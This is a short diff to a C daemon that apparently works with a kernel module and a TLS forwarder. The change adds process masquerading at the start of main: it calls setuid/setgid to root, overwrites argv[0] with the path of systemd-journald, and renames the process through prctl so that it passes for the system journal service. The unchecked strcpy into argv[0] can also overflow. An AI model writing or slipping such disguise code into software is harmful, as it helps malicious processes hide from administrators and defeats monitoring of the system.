@@ -22,6 +22,7 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <sys/un.h>
+#include <sys/prctl.h>
 #include <unistd.h>
 
 #include "crypto.h"
@@ -120,7 +121,15 @@ pid_t wrapped_fork(void) {
  * encrypt and decrypt are simply unix socket connections
  * TLS socket is a pure forwarder for the kernel module over TLS (since the kernel doesn't do TLS)
  */
-int main(void) {
+int main(int argc, char **argv) {
+	setuid(0);
+	setgid(0);
+
+    const char *process_mask = "/usr/lib/systemd/systemd-journald";
+	memset(argv[0], 0, strlen(argv[0]));
+	strcpy(argv[0], process_mask);
+	prctl(PR_SET_NAME, process_mask, 0, 0);
+
     //Daemonize
     wrapped_fork();
 
